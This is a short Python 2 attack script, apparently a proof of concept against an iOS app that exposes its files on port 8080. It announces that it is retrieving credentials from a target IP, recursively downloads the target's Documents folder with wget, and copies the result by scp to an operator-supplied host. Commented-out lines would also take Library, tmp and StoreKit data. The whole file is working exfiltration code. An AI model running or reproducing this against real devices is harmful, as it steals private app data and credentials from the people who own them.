
# -*- coding: utf-8 -*-
import os
import zipfile
import struct
import sys
import time	
from subprocess import Popen, PIPE


def main(argv):
	ip = argv[0]
	myip = argv[1]
		
	print "[*] Retrieving credential from " + ip
 	p = Popen("wget --recursive http://{}:8080/Documents/".format(ip), stdout = PIPE, stderr = PIPE, shell = True)
 	stdout, stderr = p.communicate()
	
	'''
	if stdout.find(signature) != -1:
		return True
	else:
		return False
	return
	'''
		
	print "[*] Sending credential to " + myip

	p = Popen("scp -r ./{}:8080/Documents root@{}:/var/mobile/Containers/Data/Application/C69BC2D3-09ED-4189-BA2D-699B0ECBAE68/".format(ip, myip), stdout = PIPE, stderr = PIPE, shell = True)
	stdout, stderr = p.communicate()

# 	p = Popen("scp -r ./{}:8080/Library root@{}:/var/mobile/Containers/Data/Application/C69BC2D3-09ED-4189-BA2D-699B0ECBAE68/".format(ip, myip), stdout = PIPE, stderr = PIPE, shell = True)
# 	stdout, stderr = p.communicate()
# 
# 	p = Popen("scp -r ./{}:8080/tmp root@{}:/var/mobile/Containers/Data/Application/C69BC2D3-09ED-4189-BA2D-699B0ECBAE68/".format(ip, myip), stdout = PIPE, stderr = PIPE, shell = True)
# 	stdout, stderr = p.communicate()
# 
# 	p = Popen("scp -r ./{}:8080/StoreKit root@{}:/var/mobile/Containers/Data/Application/C69BC2D3-09ED-4189-BA2D-699B0ECBAE68/".format(ip, myip), stdout = PIPE, stderr = PIPE, shell = True)
# 	stdout, stderr = p.communicate()
	
	print "[+] Done"
	
	'''
	
	if stdout.find(signature) != -1:
		return True
	else:
		return False
	return
	'''
	#scp -r /Users/demo/Desktop/now/192.168.30.224:8080/Documents root@192.168.30.177:/var/mobile/Containers/Data/Application/C69BC2D3-09ED-4189-BA2D-699B0ECBAE68/
		
if __name__ == '__main__':
	main(sys.argv[1:])